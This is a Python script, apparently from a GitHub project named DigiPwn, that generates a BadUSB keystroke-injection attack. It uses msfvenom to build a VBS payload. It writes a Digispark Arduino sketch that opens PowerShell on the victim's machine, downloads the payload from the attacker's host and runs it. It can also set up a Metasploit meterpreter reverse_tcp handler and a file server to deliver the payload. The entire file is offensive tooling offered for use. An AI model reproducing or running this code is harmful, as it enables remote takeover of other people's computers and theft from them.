#	Created by Sharon Shaju
#	Follow me on Instagram
#		https://www.instagram.com/zero.overflow
#	My GitHub
#		https://github.com/zer0overflow/DigiPwn
#
#		Copyrights Reserverd! Do not use my code without mentioning me!
import sys, os

host = sys.argv[1]
port = sys.argv[2]
payload = sys.argv[3]
os.system('msfvenom -p %s LHOST=%s LPORT=%s -f vbs -o malware.vbs' % (payload, host, port))
filename = 'malware.vbs'
code = '''
/*
 *          Created by Sharon Shaju
 *          Follow me on Instagram
 *                https://www.instagram.com/zero.overflow
 *          My GitHub
 *                https://www.github.com/zer0overflow
*/
#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke( KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.println("$WebClient = New-Object System.Net.WebClient");
  DigiKeyboard.println("$WebClient.DownloadFile(\\"http://%s:3456/%s\\",\\"%s\\")");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("start %s");
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH);
}

void loop() {

}
''' % (host, filename, filename, filename)

f = open('keystroke_inject.ino', 'w')
cc = 'keystroke_inject.ino'
f.write(code)
f.close()
print(" [+] File saved to %s" % cc)
print(" [*] Open Arduino >> File >> Open >> %s" % cc)
if raw_input(' Do you want to start a metasploit stager and file hosting?[y/n] ').lower() == 'y':
	rc_file = open('msf.rc', 'w')
	cmd = 'use multi/handler\n' + \
		'set LHOST 0.0.0.0\n' + \
		'set LPORT 8080\n' + \
		'set PAYLOAD windows/meterpreter/reverse_tcp\n' + \
		'run -j'
	rc_file.write(cmd)
	rc_file.close()
	print(" [+] RC File created and saved to msf.rc . run \"msfconsole -r msf.rc\"")
	print(' [!] starting file host')
	os.system('python -m SimpleHTTPServer 3456')
else:
	exit()

